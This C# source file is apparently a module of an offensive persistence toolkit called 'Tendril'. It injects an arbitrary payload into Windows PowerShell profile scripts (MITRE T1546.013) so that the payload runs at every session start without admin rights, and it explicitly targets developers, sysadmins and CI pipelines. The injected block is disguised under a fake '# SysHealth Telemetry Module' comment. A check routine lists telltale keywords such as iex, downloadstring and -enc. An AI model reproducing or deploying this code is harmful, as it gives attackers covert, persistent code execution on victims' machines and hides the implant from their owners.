using System;
using System.Collections.Generic;
using System.IO;
using Tendril.Core;

namespace Tendril.Modules
{
    /// <summary>
    /// PowerShell Profile Persistence (T1546.013)
    ///
    /// PowerShell executes profile scripts on startup. Four profile paths exist:
    ///   1. AllUsersAllHosts:    $PSHOME\Profile.ps1
    ///   2. AllUsersCurrentHost: $PSHOME\Microsoft.PowerShell_profile.ps1
    ///   3. CurrentUserAllHosts: ~\Documents\PowerShell\Profile.ps1 (PS7) or
    ///                           ~\Documents\WindowsPowerShell\Profile.ps1 (PS5)
    ///   4. CurrentUserCurrentHost: ~\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
    ///
    /// The CurrentUser paths require no admin. Payload runs every time the target
    /// opens a PowerShell session - developers, sysadmins, CI pipelines.
    /// </summary>
    public class PowerShellProfile : ITendril
    {
        public string Name { get { return "PowerShellProfile"; } }
        public string Description { get { return "PowerShell profile injection - runs on every PS session start"; } }
        public string MitreId { get { return "T1546.013"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        // Marker comment so we can identify and remove our injections
        private const string Marker = "# SysHealth Telemetry Module";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, scope;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<ps_command_or_scriptpath>");

            if (!options.TryGetValue("scope", out scope))
                scope = "currentuser"; // "currentuser" or "allusers"

            string profilePath = GetProfilePath(scope);
            if (profilePath == null)
                return new TendrilResult(ResultStatus.Failed, Name, "Could not resolve profile path");

            try
            {
                // Create directory if needed
                string dir = Path.GetDirectoryName(profilePath);
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                // Append to existing profile (don't clobber)
                string block = string.Format("\r\n{0}\r\n{1}\r\n", Marker, payload);

                // Check if already injected
                if (File.Exists(profilePath))
                {
                    string existing = File.ReadAllText(profilePath);
                    if (existing.Contains(Marker))
                        return new TendrilResult(ResultStatus.Warning, Name, "Profile already contains injection");
                }

                File.AppendAllText(profilePath, block);

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("Profile modified: {0}", profilePath))
                    .WithMeta("ProfilePath", profilePath)
                    .WithMeta("Scope", scope);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "Profile write failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string scope;
            if (!options.TryGetValue("scope", out scope))
                scope = "currentuser";

            string profilePath = GetProfilePath(scope);
            if (profilePath == null || !File.Exists(profilePath))
                return new TendrilResult(ResultStatus.Warning, Name, "Profile not found");

            try
            {
                string content = File.ReadAllText(profilePath);
                if (!content.Contains(Marker))
                    return new TendrilResult(ResultStatus.Warning, Name, "No injection marker found in profile");

                // Remove everything from marker to next marker or end of injection block
                string[] lines = File.ReadAllLines(profilePath);
                var cleaned = new List<string>();
                bool skipping = false;
                foreach (string line in lines)
                {
                    if (line.Trim() == Marker.Trim())
                    {
                        skipping = !skipping; // toggle: start skip on first marker
                        if (!skipping) continue; // skip the closing marker line too
                        continue;
                    }
                    if (!skipping)
                        cleaned.Add(line);
                }

                File.WriteAllLines(profilePath, cleaned.ToArray());
                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("Injection removed from {0}", profilePath));
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "Removal failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            string[] profiles = {
                GetProfilePath("currentuser"),
                GetProfilePath("allusers"),
                // PS7 path
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    "PowerShell", "Profile.ps1"),
            };

            foreach (string p in profiles)
            {
                if (p == null) continue;
                if (File.Exists(p))
                {
                    var fi = new FileInfo(p);
                    string content = "";
                    try { content = File.ReadAllText(p); } catch { }

                    bool hasMarker = content.Contains(Marker);
                    bool suspicious = content.ToLower().Contains("invoke-expression") ||
                                     content.ToLower().Contains("iex ") ||
                                     content.ToLower().Contains("downloadstring") ||
                                     content.ToLower().Contains("-enc ");

                    if (hasMarker || suspicious || fi.Length > 0)
                    {
                        results.Add(new TendrilResult(
                            hasMarker || suspicious ? ResultStatus.Warning : ResultStatus.Info,
                            Name, string.Format("Profile exists: {0} ({1} bytes)", p, fi.Length))
                            .WithMeta("Path", p)
                            .WithMeta("Size", fi.Length.ToString())
                            .WithMeta("HasTendrilMarker", hasMarker.ToString())
                            .WithMeta("SuspiciousContent", suspicious.ToString()));
                    }
                }
            }
            return results;
        }

        private static string GetProfilePath(string scope)
        {
            if (scope.ToLower() == "allusers")
            {
                string psHome = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    @"WindowsPowerShell\v1.0");
                return Path.Combine(psHome, "Profile.ps1");
            }

            // CurrentUser - WindowsPowerShell (PS5)
            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            return Path.Combine(docs, @"WindowsPowerShell\Microsoft.PowerShell_profile.ps1");
        }
    }
}
